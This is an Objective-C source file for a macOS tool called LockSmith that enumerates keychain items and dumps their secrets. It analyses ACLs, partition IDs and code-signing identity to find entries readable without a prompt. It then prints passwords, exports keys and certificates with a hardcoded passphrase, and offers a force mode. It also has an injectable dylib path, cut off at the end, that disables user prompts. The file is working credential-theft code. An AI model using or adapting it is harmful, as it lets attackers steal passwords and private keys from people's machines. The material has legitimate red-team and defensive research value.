//
//  main.m
//  LockSmith
//
//  Created by Cody Thomas on 5/13/22.
//

#import <Foundation/Foundation.h>
#include "utilities.h"
#include <unistd.h>        // getpid()
#include <stdio.h>        // printf() etc
#include <stdlib.h>        // atoi()
#include <string.h>        // strlen()
#include <errno.h>        // strerror()
#include <Security/SecACL.h>
#include "codesign.h"        // csops() and additional flags
#include <pthread.h>

OSStatus SecKeychainItemCopyAllExtendedAttributes(
    SecKeychainItemRef            itemRef,
    CFArrayRef                    *attrNames,            /* RETURNED, each element is a CFStringRef */
    CFArrayRef                    *attrValues);
CFStringRef GetAuthStringFromACLAuthorizationTag(sint32);
void GetAllKeychainItems(NSString* account, NSString* label, NSString *accessGroup, NSString* partitionID, bool force, bool validateTrustedApplications);
void printItem(NSDictionary *item, int index);

void printItem(NSDictionary *item, int index){
    printf("=================================\n");
    printf("      Keychain Entry %d\n", index);
    printf("=================================\n");
    printf("Account:       %s\n", [[item objectForKey:@"acct"] UTF8String]);
    printf("Label:         %s\n", [[item objectForKey:@"labl"] UTF8String]);
    printf("Service:       %s\n", [[item objectForKey:@"svce"] UTF8String]);
    NSDateFormatter *format = [[NSDateFormatter alloc] init];
    format.dateFormat = @"YYYY-MM-dd HH:mm:ss";
    format.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
    if( [item objectForKey:@"cdat"]){
        NSMutableString* creationTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[item objectForKey:@"cdat"]]];
        printf("Creation Date: %s\n", [creationTime UTF8String]);
    } else {
        printf("Creation Date: (null)\n");
    }
    if( [item objectForKey:@"mdat"] ){
        NSMutableString* modificationTime = [[NSMutableString alloc] initWithString:[format stringFromDate:[item objectForKey:@"mdat"]]];
        printf("Modify Date:   %s\n", [modificationTime UTF8String]);
    } else {
        printf("Modify Date:   (null)\n");
    }
    NSString* entryClass = [item objectForKey:@"class"];
    printf("Class:         %s\n", [entryClass UTF8String]);
    if( [item objectForKey:@"invi"] ){
        printf("Invisible:    %s\n", [[item objectForKey:@"invi"] boolValue] ? "YES" : "NO");
    }
    if( [item objectForKey:@"gena"] ){
        printf("General:      %s\n", [[[item objectForKey:@"gena"] base64EncodedStringWithOptions:0] UTF8String]);
    }
    if( [item objectForKey:@"desc"] ){
        printf("Description:   %s\n", [[item objectForKey:@"desc"] UTF8String]);
    }
    if( [item objectForKey:@"icmt"] ){
        printf("Comment:      %s\n", [[item objectForKey:@"icmt"] UTF8String]);
    }
    // internet password data
    if( [item objectForKey:@"port"] ){
        if( [[item objectForKey:@"port"] intValue] != 0 ){
            printf("Port:          %d\n", [[item objectForKey:@"port"] intValue]);
        }
    }
    if( [item objectForKey:@"srvr"] ){
        printf("Server:        %s\n", [[item objectForKey:@"srvr"] UTF8String]);
    }
    if ([item objectForKey:@"ptcl"] ){
        NSString* htps = @"htps";
        NSString* htp = @"htp";
        if( [htps compare:[item objectForKey:@"ptcl"]] == 0 ){
            printf("Protocol:      HTTPS\n");
        } else if( [htp compare:[item objectForKey:@"ptcl"]] == 0){
            printf("Protocol:      HTTP\n");
        } else {
            printf("Protocol:      %s\n", [[item objectForKey:@"ptcl"] UTF8String]);
        }
    }
    if( [item objectForKey:@"atyp"] ){
        printf("atyp:          %s\n", [[item objectForKey:@"atyp"] UTF8String]);
    }
    // certificate password data
    if( [entryClass compare:@"cert"] == 0 ){
        printf("Certificate details:\n");
        if( [item objectForKey:@"ctyp"] ){
            printf("\tCert Type:  %d\n", [[item objectForKey:@"ctyp"] intValue]);
        }
        if( [item objectForKey:@"subj"] ){
            printf("\tCert Subj:  %s\n", [[[item objectForKey:@"subj"] base64EncodedStringWithOptions:0] UTF8String]);
        }
        if( [item objectForKey:@"pkhh"] ){
            printf("\tCert pkhh:  %s\n", [[[item objectForKey:@"pkhh"] base64EncodedStringWithOptions:0] UTF8String]);
        }
        if( [item objectForKey:@"skid"] ){
            printf("\tCert skid:  %s\n", [[[item objectForKey:@"skid"] base64EncodedStringWithOptions:0] UTF8String]);
        }
        if( [item objectForKey:@"issr"] ){
            printf("\tCert issr:  %s\n", [[[item objectForKey:@"issr"] base64EncodedStringWithOptions:0] UTF8String]);
        }
        if( [item objectForKey:@"slnr"] ){
            printf("\tCert slnr:  %s\n", [[[item objectForKey:@"slnr"] base64EncodedStringWithOptions:0] UTF8String]);
        }
        if( [item objectForKey:@"cenc"] ){
            if( [[item objectForKey:@"cenc"] isKindOfClass:[NSNumber class]]){
                printf("\tCert cenc:  %d\n", [[item objectForKey:@"cenc"] intValue]);
            }else{
                printf("\tCert cenc:  %s\n", [[[item objectForKey:@"cenc"] base64EncodedStringWithOptions:0] UTF8String]);
            }
            
        }
    } else if ( [entryClass compare:@"keys"] == 0 ){
        printf("Key details:\n");
        // key data
        if( [item objectForKey:@"sign"] ){
            printf("\tSignable:   %s\n", [[item objectForKey:@"sign"] boolValue] ? "YES" : "NO");
        }
        if( [item objectForKey:@"kcls"] ){
            printf("\tkcls:       %s\n", [[item objectForKey:@"kcls"] UTF8String]);
        }
        if( [item objectForKey:@"encr"] ){
            printf("\tEncrypt:    %s\n", [[item objectForKey:@"encr"] boolValue] ? "YES" : "NO");
        }
        if( [item objectForKey:@"decr"] ){
            printf("\tDecrypt:    %s\n", [[item objectForKey:@"decr"] boolValue] ? "YES" : "NO");
        }
        if( [item objectForKey:@"wrap"] ){
            printf("\tWrap Key:   %s\n", [[item objectForKey:@"wrap"] boolValue] ? "YES" : "NO");
        }
        if( [item objectForKey:@"unwp"] ){
            printf("\tUnwrap Key: %s\n", [[item objectForKey:@"unwp"] boolValue] ? "YES" : "NO");
        }
        if( [item objectForKey:@"vrfy"] ){
            printf("\tVerify Key: %s\n", [[item objectForKey:@"vrfy"] boolValue] ? "YES" : "NO");
        }
        if( [item objectForKey:@"type"] ){
            printf("\tKey Type:   %s\n", [[item objectForKey:@"type"] UTF8String]);
        }
        if( [item objectForKey:@"perm"] ){
            printf("\tPermanent:  %s\n", [[item objectForKey:@"perm"] boolValue] ? "YES" : "NO");
        }
        if( [item objectForKey:@"drve"] ){
            printf("\tDerive Key: %s\n", [[item objectForKey:@"drve"] boolValue] ? "YES" : "NO");
        }
        if( [item objectForKey:@"klbl"] ){
            printf("\tklbl:       %s\n", [[[item objectForKey:@"klbl"] base64EncodedStringWithOptions:0] UTF8String]);
        }
        if( [item objectForKey:@"esiz"] ){
            printf("\tesiz:       %d\n", [[item objectForKey:@"esiz"] intValue]);
        }
        if( [item objectForKey:@"bsiz"] ){
            printf("\tbsiz:       %d\n", [[item objectForKey:@"bsiz"] intValue]);
        }
    }
    CFArrayRef attrNames;
    CFArrayRef attrValues;
    OSStatus stat;
    stat = SecKeychainItemCopyAllExtendedAttributes((__bridge SecKeychainItemRef _Nonnull)[item objectForKey:@"v_Ref"], &attrNames, &attrValues);
    if(stat == ERR_SUCCESS){
        printf("Got extended attributes\n");
    }
}


void printPasswordData(SecKeychainItemRef secItemRef, NSString* keyType){
    if( [keyType containsString:@"genp"] || [keyType containsString:@"inet"]){
        UInt32 cfDataLength;
        void* cfData;
        OSStatus result = SecKeychainItemCopyContent(secItemRef, nil, nil, &cfDataLength, &cfData);
        
        if(result == ERR_SUCCESS){
            NSData* entryData = [[NSData alloc] initWithBytes:cfData length:cfDataLength];
            NSString* entryString = [[NSString alloc] initWithData:entryData encoding:NSUTF8StringEncoding];
            printf("SENSITIVE SECRET: \n%s\n", [entryString UTF8String]);
            //printf("SENSITIVE SECRET BASE64: %s\n", [[[NSString alloc] initWithData:[entryData base64EncodedDataWithOptions:0] encoding:NSUTF8StringEncoding] UTF8String] );
            //printf("[++++++++++++] SENSITIVE SECRET HERE [++++++++++++]\n");
        } else if(result == -25293) {
            printf("Failed to get password - Invalid Username/Password\n");
        } else if(result == -128){
            printf("Failed to get password - User cancelled prompt\n");
        } else {
            printf("Failed to get password with error: %d\n", result);
        }
    } else {
        CFDataRef exportedData;
        SecItemImportExportKeyParameters params;
        SecItemImportExportFlags itemFlags = kSecItemPemArmour;
        params.keyUsage = NULL;
        params.version = SEC_KEY_IMPORT_EXPORT_PARAMS_VERSION;
        params.keyAttributes = NULL;
        params.alertTitle = NULL;
        params.alertPrompt = NULL;
        params.accessRef = NULL;
        params.flags = 0;
        OSStatus result = SecItemExport(secItemRef, kSecFormatUnknown, itemFlags, nil, &exportedData);
        if(result == ERR_SUCCESS){
            NSData* entryData = (__bridge NSData *)(exportedData);
            NSString* entryString = [[NSString alloc] initWithData:entryData encoding:NSUTF8StringEncoding];
            printf("SENSITIVE SECRET: \n%s\n", [entryString UTF8String]);
            //printf("SENSITIVE SECRET BASE64: %s\n", [[[NSString alloc] initWithData:[entryData base64EncodedDataWithOptions:0] encoding:NSUTF8StringEncoding] UTF8String] );
            //printf("[++++++++++++] SENSITIVE SECRET HERE [++++++++++++]\n");
        } else if(result == -25260){
            params.passphrase = (__bridge CFStringRef)@"LockSmith";
            // https://github.com/Apple-FOSS-Mirror/libsecurity_keychain/blob/master/lib/SecImportExport.h#L151
            if( [keyType containsString:@"cert"] ){
                result = SecItemExport(secItemRef, kSecFormatPKCS12, itemFlags, &params, &exportedData);
            }else {
                result = SecItemExport(secItemRef, kSecFormatPKCS12, itemFlags, &params, &exportedData);
            }
            
            if(result == ERR_SUCCESS){
                NSData* entryData = (__bridge NSData *)(exportedData);
                printf("Passphrase: LockSmith\n");
                NSString* entryString = [[NSString alloc] initWithData:entryData encoding:NSUTF8StringEncoding];
                printf("SENSITIVE SECRET: \n%s\n", [entryString UTF8String]);
                //printf("SENSITIVE SECRET BASE64: %s\n", [[[NSString alloc] initWithData:[entryData base64EncodedDataWithOptions:0] encoding:NSUTF8StringEncoding] UTF8String] );
                //printf("[++++++++++++] SENSITIVE SECRET HERE [++++++++++++]\n");
            } else if(result == -25293){
                printf("Failed to get password - requires passphrase\n");
            } else if(result == -128){
                printf("Failed to get password - user canceled prompt\n");
            } else {
                printf("Failed to get password with error: %d\n", result);
            }
        } else if(result == -25316){
            printf("Failed to get password - the contents of this item cannot be retrieved.\n");
        } else if(result == -128){
            printf("Failed to get password - user cancelled prompt\n");
        } else {
            printf("Failed to get password with error: %d\n", result);
        }
    }
    
}
void printACLs(NSDictionary *item, NSString* partitionID, bool force, bool validateTrustedApplications){
    SecAccessRef accessRef;
    OSStatus stat = SecKeychainItemCopyAccess((__bridge SecKeychainItemRef _Nonnull)([item objectForKey:@"v_Ref"]), &accessRef);
    if(stat == -25243){
        printf("Entry has no ACL entries\n");
        printPasswordData((__bridge SecKeychainItemRef _Nonnull)([item objectForKey:@"v_Ref"]), [item objectForKey:@"class"]);
        return;
    }
    if(stat != ERR_SUCCESS){
        printf("Failed to get keychain access reference with error: %d\n", stat);
        return;
    }
    CFArrayRef acls;
    CFArrayRef ownerACLS;
    stat = SecAccessCopyACLList(accessRef, &acls);
    if(stat != ERR_SUCCESS){
        CFRelease(accessRef);
        printf("Failed to get ACL list for keychain access reference with error: %d\n", stat);
        return;
    }
    uid_t maxValue = -1;
    uid_t userId = -1;
    gid_t groupId = -1;
    SecAccessOwnerType ownerType = -1;
    stat = SecAccessCopyOwnerAndACL(accessRef, &userId, &groupId, &ownerType, &ownerACLS);
    if(stat != ERR_SUCCESS){
        printf("Failed to get owner information: error %d\n", stat);
    }
    bool canGetPasswordBasedOnOwner = false;
    bool canGetPasswordBasedOnOwnerAuthorizations = false;
    bool ownerInfoSet = false;
    if(userId != maxValue){
        printf("OwnerID: %u\n", userId);
    }
    if(groupId != maxValue){
        printf("GroupID: %u\n", groupId);
    }
    if(ownerType != maxValue){
        printf("OwnerType: 0x%X\n", ownerType);
        ownerInfoSet = true;
        if( (ownerType & kSecUseOnlyUID) && (ownerType & kSecUseOnlyGID) ){
            // this means that only one of these has to be true
            if(userId == getuid() || groupId == getgid()){
                printf("\tOwner Authorizations based on UID or GID, one of ours match\n");
                canGetPasswordBasedOnOwner = true;
            }
        } else if( (ownerType & kSecUseOnlyUID) && userId == getuid() ){
            if (userId != 0){
                printf("\tOwner Authorizations based on UID, ours match\n");
                canGetPasswordBasedOnOwner = true;
            } else {
                if( (ownerType & kSecHonorRoot) ){
                    printf("\tOwner Authorizations based on root user and SecHonorRoot, ours match\n");
                    canGetPasswordBasedOnOwner = true;
                } else {
                    // we're not treating root user as a typical user for ownership purposes.
                    printf("\tWe're root, but root isn't treated as standard user\n");
                    canGetPasswordBasedOnOwner = false;
                }
            }
            
        } else if( (ownerType & kSecUseOnlyGID) && groupId == getgid() ){
            printf("\tOwner Authorizations based on GID and ours match\n");
            canGetPasswordBasedOnOwner = true;
        } else {
            printf("\tOwner Authorizations don't match our user context\n");
            canGetPasswordBasedOnOwner = false;
        }
    } else {
        printf("Owner Authorizations based on ACLAuthorizationPartitionID\n");
    }
    
    if(ownerACLS != nil){
        printf("Owner Authorizations:\n");
        for(int i = 0; i < CFArrayGetCount(ownerACLS); i++){
            NSString* ownerACL = (__bridge NSString*)CFArrayGetValueAtIndex(ownerACLS, i);
            if(ownerACL != NULL){
                printf("\t%s\n", [ownerACL UTF8String]);
                if( canDecryptEntry((__bridge NSString*)CFArrayGetValueAtIndex(ownerACLS, i)) ){
                    canGetPasswordBasedOnOwnerAuthorizations = true;
                }
            } else {
                // maybe
                printf("\tNULL Owner Authorization\n");
                canGetPasswordBasedOnOwner = true;
            }
        }
    } else {
        printf("\tNo Owner Authorizations specified\n");
        // maybe
        canGetPasswordBasedOnOwner = true;
    }
    
    printf("------------ACLS------------\n");
    // partitionIDs is a single static check
    bool hasNecessaryPartitionIDs = false;
    bool hasPartitionIDSet = false;
    bool hasNecessaryAuthorizationsAndIsTrustedApplication = false;
    bool hasNecessaryAuthorizationsAndAllApplicationsTrusted = false;
    if(acls != nil){
        for(int i = 0; i < CFArrayGetCount(acls); i++){
            printf("\t--- Entry %d\n", i);
            // trusted app and necessary authorizations have to happen together in a single entry
            bool perACLIsTrustedApplication = false;
            bool perACLHasNecessaryAuthorizations = false;
            bool perACLAllApplicationsTrusted = false;
            uint16 promptSelectorValue;
            SecKeychainPromptSelector promptSelector;
            SecACLRef cfAclRef = (SecACLRef)CFArrayGetValueAtIndex(acls, i);
            CFArrayRef cfApplicationList = nil;
            CFStringRef cfDescription = nil;
            stat = SecACLCopyContents(cfAclRef, &cfApplicationList, &cfDescription, &promptSelector);
            if(stat != ERR_SUCCESS){
                printf("\t\tFailed to copy contents with error: %d\n", stat);
                CSSM_ACL_KEYCHAIN_PROMPT_SELECTOR promptSelectorSimple;
                stat = SecACLCopySimpleContents(cfAclRef, &cfApplicationList, &cfDescription, &promptSelectorSimple);
                if(stat != ERR_SUCCESS){
                    printf("\t\tFailed to copy simple contents with error: %d\n", stat);
                    CFArrayRef cfAuthorizations = SecACLCopyAuthorizations(cfAclRef);
                    if (cfAuthorizations == nil){
                        printf("\t\tNo Authorizations\n");
                    } else {
                        printf("\t\tAuthorizations: \n");
                        for(int j = 0; j < CFArrayGetCount(cfAuthorizations); j++){
                            NSString *authorization = CFArrayGetValueAtIndex(cfAuthorizations, j);
                            printf("\t\t\t %s\n", [authorization UTF8String]);
                            if( canDecryptEntry(authorization) ){
                                perACLHasNecessaryAuthorizations = true;
                            }
                        }
                    }
                    if(cfAuthorizations != nil){
                        CFRelease(cfAuthorizations);
                    }
                    continue;
                } else {
                    promptSelectorValue = promptSelectorSimple.flags;
                }
            } else {
                promptSelectorValue = promptSelector;
            }
            NSString* description = (__bridge NSString*)cfDescription;
            if( [description containsString:@"3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d225554462d38223f3e0a"] ) {
                // 3c3f786d6c2076657273696f6e3d22312e302220656e636f64696e673d225554462d38223f3e0a
                // is "<?xml version="1.0" encoding="UTF-8"?>" which means we're looking at a plist for the description
                hasNecessaryPartitionIDs = false;
                hasPartitionIDSet = true;
                if (([description length] % 2) == 0){
                    NSPropertyListFormat format = NSPropertyListXMLFormat_v1_0;
                    NSMutableString *string = [NSMutableString string];
                    //https://stackoverflow.com/questions/6421282/how-to-convert-hex-to-nsstring-in-objective-c
                    for (NSInteger i = 0; i < [description length]; i += 2) {
                        NSString *hex = [description substringWithRange:NSMakeRange(i, 2)];
                        unsigned int decimalValue = 0;
                        sscanf([hex UTF8String], "%x", &decimalValue);
                        [string appendFormat:@"%c", decimalValue];
                    }
                    NSDictionary *plist = [NSPropertyListSerialization propertyListWithData:[string dataUsingEncoding:NSUTF8StringEncoding] options:NSPropertyListImmutable format:&format error:nil];
                    if( [plist objectForKey:@"Partitions"] ){
                        SecStaticCodeRef staticCode = NULL;
                        NSString* teamID = nil;
                        NSString* teamIDString = nil;
                        bool isApplePlatform = false;
                        CFURLRef cfURLRef = CFURLCreateFromFileSystemRepresentation(kCFAllocatorDefault, [getCurrentProcessName() UTF8String], getCurrentProcessName().length, false);
                        OSStatus status = SecStaticCodeCreateWithPath(cfURLRef , 0, &staticCode);
                        if(status == 0){
                            CFDictionaryRef codeInfo = NULL;
                            status = SecCodeCopySigningInformation(staticCode,  kSecCSSigningInformation, &codeInfo);
                            if(status == 0){
                                NSDictionary* nsCodeInfo = (__bridge NSDictionary*) codeInfo;
                                //NSLog(@"codeInfo:\n%@", nsCodeInfo);
                                if(nsCodeInfo[@"teamid"]){
                                    NSString* teamid = nsCodeInfo[@"teamid"];
                                    teamIDString = teamid;
                                    teamID = [[NSString alloc] initWithFormat:@"teamid:%s", [teamid UTF8String]];
                                }
                                if(nsCodeInfo[@"platform-identifier"]){
                                    NSNumber* platformID = nsCodeInfo[@"platform-identifier"];
                                    isApplePlatform = [platformID intValue] == 13;
                                }
                            }
                        }
                        NSArray *partitions = [plist objectForKey:@"Partitions"];
                        //NSLog(@"%@\n", plist);
                        NSString *partition_string = [partitions componentsJoinedByString:@","];
                        printf("\t\tAllowed Code Signatures: %s\n", [partition_string UTF8String]);
                        for(uint32 i = 0; i < [partitions count]; i++){
                            if(partitionID != nil){
                                // this means we want to force try to decrypt if we match a certain partitionID
                                if([partitionID isEqualToString:partitions[i]]){
                                    hasNecessaryPartitionIDs = true;
                                    printf("\t\t\tMatches specified partitionID\n");
                                }
                            }
                            if([partitions[i] containsString:@"cdhash:"]){
                                NSString *myCDHash = [[NSString alloc] initWithFormat:@"cdhash:%s", exec_csops_cdhash()];
                                if([myCDHash isEqualToString:partitions[i]]){
                                    hasNecessaryPartitionIDs = true;
                                    printf("\t\t\tCDHash matches current application\n");
                                }else{
                                    printf("\t\t\tCDHash doesn't match current application: %s\n", exec_csops_cdhash());
                                }
                            }else if([partitions[i] containsString:@"teamid:"]){
                                if(teamID == nil){
                                    printf("\t\t\tTeamID doesn't match current application: nil\n");
                                } else if([teamID isEqualToString:partitions[i]]){
                                    hasNecessaryPartitionIDs = true;
                                    printf("\t\t\tTeamID maches current application: %s\n", [teamID UTF8String]);
                                } else {
                                    printf("\t\t\tTeamID doesn't match current application: %s\n", [teamID UTF8String]);
                                }
                            }else if([partitions[i] containsString:@"apple:"]){
                                if(isApplePlatform){
                                    hasNecessaryPartitionIDs = true;
                                } else if(teamID != nil && [teamIDString isEqualToString:@"59GAB85EFG"]){
                                    // test based on teamid from running dylib within python3
                                    hasNecessaryPartitionIDs = true;
                                }else{
                                    printf("\t\t\tNot an apple platform binary\n");
                                }
                            }else if([partitions[i] containsString:@"apple-tool:"]){
                                if(isApplePlatform){
                                    hasNecessaryPartitionIDs = true;
                                }else{
                                    printf("\t\t\tNot an apple platform binary\n");
                                }
                            }
                        }
                        
                    }
                }
                
            }
            printf("\t\tDescription: %s\n", [description UTF8String]);
            //printf("\tPromptSelector: %u\n", promptSelectorValue);
            switch (promptSelectorValue) {
                case kSecKeychainPromptRequirePassphase:
                    printf("\t\t\tRequire re-entering of passphrase\n");
                    break;
                case kSecKeychainPromptUnsigned:
                    printf("\t\t\tPrompt for unsigned clients\n");
                    break;
                case kSecKeychainPromptUnsignedAct:
                    printf("\t\t\tUNSIGNED bit overrides system default\n");
                    break;
                case kSecKeychainPromptInvalid:
                    printf("\t\t\tPrompt for invalid signed clients\n");
                    break;
                case kSecKeychainPromptInvalidAct:
                    printf("\t\t\tInvalid Act\n");
                    break;
                default:
                    break;
            }
            /*
             kSecKeychainPromptRequirePassphase = 0x0001, // require re-entering of passphrase
             // the following bits are ignored by 10.4 and earlier
             kSecKeychainPromptUnsigned = 0x0010,            // prompt for unsigned clients
             kSecKeychainPromptUnsignedAct = 0x0020,        // UNSIGNED bit overrides system default
             kSecKeychainPromptInvalid = 0x0040,            // prompt for invalid signed clients
             kSecKeychainPromptInvalidAct = 0x0080,
             */
            
            if(cfApplicationList != nil) {
                if( CFArrayGetCount(cfApplicationList) == 0){
                    printf("\t\tNo applications are trusted\n");
                } else {
                    //printf("about to loop through application list\n");
                    //printf("about to loop through application list with count: %ld\n", CFArrayGetCount(cfApplicationList));
                    for(int j = 0; j < CFArrayGetCount(cfApplicationList); j++){
                        bool lookingAtSelf = false;
                        CFDataRef cfAppData;
                        SecTrustedApplicationCopyData((SecTrustedApplicationRef)CFArrayGetValueAtIndex(cfApplicationList, j), &cfAppData);
                        NSData *appData = (__bridge NSData *)(cfAppData);
                        NSString* trustedApp = [[NSString alloc] initWithData:appData encoding:NSUTF8StringEncoding];
                        printf("\t\tTrusted App: %s\n", [trustedApp UTF8String]);
                        if([trustedApp containsString:getCurrentProcessName()]){
                            printf("\t\t\t\tCurrently running from trusted app\n");
                            perACLIsTrustedApplication = true;
                            lookingAtSelf = true;
                        }
                        SecRequirementRef secRequirementRef;
                        stat = SecTrustedApplicationCopyRequirement((SecTrustedApplicationRef)CFArrayGetValueAtIndex(cfApplicationList, j), &secRequirementRef);
                        if(stat == ERR_SUCCESS){
                            // now get the security requirement
                            if(secRequirementRef != nil){
                                CFStringRef requirementString;
                                stat = SecRequirementCopyString(secRequirementRef, kSecCSDefaultFlags, &requirementString);
                                if(stat == ERR_SUCCESS){
                                    printf("\t\t\tRequirement String: %s\n", [(__bridge NSString*)requirementString UTF8String]);
                                }
                            } else {
                                printf("\t\t\tNo Code Requirement for Trusted Application\n");
                            }
                            
                        }
                        
                        if( ![trustedApp containsString:@"group://"]){
                            if(validateTrustedApplications){
                                stat = SecTrustedApplicationValidateWithPath((SecTrustedApplicationRef)CFArrayGetValueAtIndex(cfApplicationList, j), (const char*)appData.bytes);
                                if(stat == ERR_SUCCESS){
                                    printf("\t\t\tApplication is valid\n");
                                }else if(stat == -67068){
                                    printf("\t\t\t\tFailed to find application on disk\n");
                                    if(perACLIsTrustedApplication && lookingAtSelf){
                                        // set this back to false since our verification failed
                                        perACLIsTrustedApplication = false;
                                    }
                                }else if(stat == -2147415734){
                                    printf("\t\t\t\tVerification Failed\n");
                                    if(perACLIsTrustedApplication && lookingAtSelf){
                                        // set this back to false since our verification failed
                                        perACLIsTrustedApplication = false;
                                    }
                                }else{
                                    printf("\t\t\t\tApplication has an error with validation: %d\n", stat);
                                    if(perACLIsTrustedApplication && lookingAtSelf){
                                        // set this back to false since our verification failed
                                        perACLIsTrustedApplication = false;
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                printf("\t\tAll applications are trusted\n");
                perACLIsTrustedApplication = true;
                perACLAllApplicationsTrusted = true;
            }
            if(cfApplicationList != nil){
                CFRelease(cfApplicationList);
            }
            if(cfDescription != nil){
                CFRelease(cfDescription);
            }
            
            CFArrayRef cfAuthorizations = SecACLCopyAuthorizations(cfAclRef);
            if (cfAuthorizations == nil){
                printf("\t\tNo Authorizations\n");
            } else {
                printf("\t\tAuthorizations: \n");
                for(int j = 0; j < CFArrayGetCount(cfAuthorizations); j++){
                    NSString *authorization = CFArrayGetValueAtIndex(cfAuthorizations, j);
                    printf("\t\t\t %s\n", [authorization UTF8String]);
                    if( canDecryptEntry(authorization) ){
                        perACLHasNecessaryAuthorizations = true;
                        
                    }
                }
            }
            if(cfAuthorizations != nil){
                CFRelease(cfAuthorizations);
            }
            CFRelease(cfAclRef);
            if( perACLHasNecessaryAuthorizations && perACLAllApplicationsTrusted){
                hasNecessaryAuthorizationsAndAllApplicationsTrusted = true;
            } else if( perACLHasNecessaryAuthorizations && perACLIsTrustedApplication){
                hasNecessaryAuthorizationsAndIsTrustedApplication = true;
            }
        }
        CFRelease(acls);
    } else {
        printf("\tFailed to get ACLS\n");
    }
    /*
    printf("ownerInfoSet: %d\n", ownerInfoSet);
    printf("canGetPasswordBasedOnOwner: %d\n", canGetPasswordBasedOnOwner);
    printf("canGetPasswordBasedOnOwnerAuthorizations: %d\n", canGetPasswordBasedOnOwnerAuthorizations);
    printf("hasNecessaryAuthorizationsAndAllApplicationsTrusted: %d\n", hasNecessaryAuthorizationsAndAllApplicationsTrusted);
    printf("hasPartitionIDSet: %d\n", hasPartitionIDSet);
    printf("hasNecessaryPartitionIDs: %d\n", hasNecessaryPartitionIDs);
    printf("hasNecessaryAuthorizationsAndIsTrustedApplication: %d\n", hasNecessaryAuthorizationsAndIsTrustedApplication);
     */
    if(force){
        printPasswordData((__bridge SecKeychainItemRef _Nonnull)([item objectForKey:@"v_Ref"]), [item objectForKey:@"class"]);
    } else {
        if( ownerInfoSet ){
            if( canGetPasswordBasedOnOwner && canGetPasswordBasedOnOwnerAuthorizations ){
                printPasswordData((__bridge SecKeychainItemRef _Nonnull)([item objectForKey:@"v_Ref"]), [item objectForKey:@"class"]);
            } else {
                printf("[-] Cannot get password data without prompting due to: password owner\n");
            }
        } else {
            if(hasNecessaryAuthorizationsAndAllApplicationsTrusted) {
                if( hasPartitionIDSet && hasNecessaryPartitionIDs) {
                    printPasswordData((__bridge SecKeychainItemRef _Nonnull)([item objectForKey:@"v_Ref"]), [item objectForKey:@"class"]);
                } else if(hasPartitionIDSet) {
                    printf("[-] Cannot get password data without prompting due to: not a valid partition ID\n");
                }
            } else if( hasNecessaryAuthorizationsAndIsTrustedApplication ){
                printPasswordData((__bridge SecKeychainItemRef _Nonnull)([item objectForKey:@"v_Ref"]), [item objectForKey:@"class"]);
            } else {
                printf("[-] Cannot get password data without prompting due to: not a trusted application or missing required authorizations\n");
            }
        }
    }
    
}

void GetAllAttrbituesOfKey(NSString* account, NSString* label, NSString *accessGroup, NSString* partitionID, CFStringRef keyClass, bool force, bool validateTrustedApplications) {
    CFMutableDictionaryRef query = CFDictionaryCreateMutable(kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(query, kSecClass, keyClass);
    if(account != nil){
        CFDictionarySetValue(query, kSecAttrAccount, CFStringCreateWithCString(kCFAllocatorDefault, [account UTF8String], kCFStringEncodingUTF8));
    }
    if(label != nil){
        CFDictionarySetValue(query, kSecAttrLabel, CFStringCreateWithCString(kCFAllocatorDefault, [label UTF8String], kCFStringEncodingUTF8));
    }
    if(accessGroup != nil){
        CFDictionarySetValue(query, kSecAttrAccessGroup, CFStringCreateWithCString(kCFAllocatorDefault, [accessGroup UTF8String], kCFStringEncodingUTF8));
    }
    CFDictionarySetValue(query, kSecMatchLimit, kSecMatchLimitAll);
    CFDictionarySetValue(query, kSecReturnAttributes, kCFBooleanTrue);
    // setting this to false makes it so we don't cause a popup
    CFDictionarySetValue(query, kSecReturnData, kCFBooleanFalse);
    // setting this to true means we _can_ fetch the data later if we want to
    CFDictionarySetValue(query, kSecReturnRef, kCFBooleanTrue);
    // not looking at thte dataprotection keychain
    CFDictionarySetValue(query, kSecUseDataProtectionKeychain, kCFBooleanFalse);
    // search case insensitively, but doesn't seem to be working
    CFDictionarySetValue(query, kSecMatchCaseInsensitive, kCFBooleanTrue);
    CFDictionarySetValue(query, kSecMatchDiacriticInsensitive, kCFBooleanTrue);
    
    CFTypeRef items;
    OSStatus result = SecItemCopyMatching(query, &items);
    if(result == ERR_SUCCESS){
        // we successfully searched for items, so loop through whwat we have
        NSArray *itemArray = (__bridge NSArray*)items;
        if([itemArray count] == 0){
            printf("[-] No Matching items\n");
        }
        for(int i = 0; i < [itemArray count]; i++){
            printItem(itemArray[i], i);
            printACLs(itemArray[i], partitionID, force, validateTrustedApplications);
        }
        CFRelease(items);
    } else if(result == errSecItemNotFound){
        printf("[-] No Matching items for type %s\n", [(__bridge NSString*) keyClass UTF8String]);
    } else {
        printf("[-] Failed to search keychain - error %d\n", result);
    }
}

void GetAllKeychainItems(NSString* account, NSString* label, NSString *accessGroup, NSString* partitionID, bool force, bool validateTrustedApplications){
    CFStringRef keyClasses[] = {kSecClassGenericPassword, kSecClassInternetPassword, kSecClassCertificate, kSecClassIdentity, kSecClassKey};
    for(int i = 0; i < 5; i++){
        GetAllAttrbituesOfKey(account, label, accessGroup, partitionID, keyClasses[i], force, validateTrustedApplications);
    }
}
bool isKeychainLocked(void);
bool isKeychainLocked(){
    SecKeychainRef myKeychain;
    OSStatus status = SecKeychainCopyDefault(&myKeychain);
    SecKeychainStatus myKeychainStatus;
    if (status == 0) {
        status = SecKeychainGetStatus(myKeychain, &myKeychainStatus);
        
        if (myKeychainStatus == 2) {
            printf("[-] Keychain is locked\n");
            CFRelease(myKeychain);
            return true;
        }
        printf("[+] Keychain is unlocked\n");
        CFRelease(myKeychain);
        return false;
    } else {
        printf("[-] failed to check keychain status with error: %d\n", status);
        CFRelease(myKeychain);
        return true;
    }

}
void* exec(void *data);
void* exec(void *data){
#ifdef DYLIB
    NSFileManager* fileManager = [NSFileManager defaultManager];
    // in case the program you're starting spawns a bunch of processes, we don't want _each_ one to load up and run this code
    // /tmp/tmp.txt acts as a global mutex so that only one runs at a time
    if([fileManager fileExistsAtPath:@"/tmp/tmp.txt"]){
        return 0;
    } else {
        [fileManager createFileAtPath:@"/tmp/tmp.txt" contents:nil attributes:nil];
    }
    printCurrentProcess();
    SecKeychainSetUserInteractionAllowed(false);
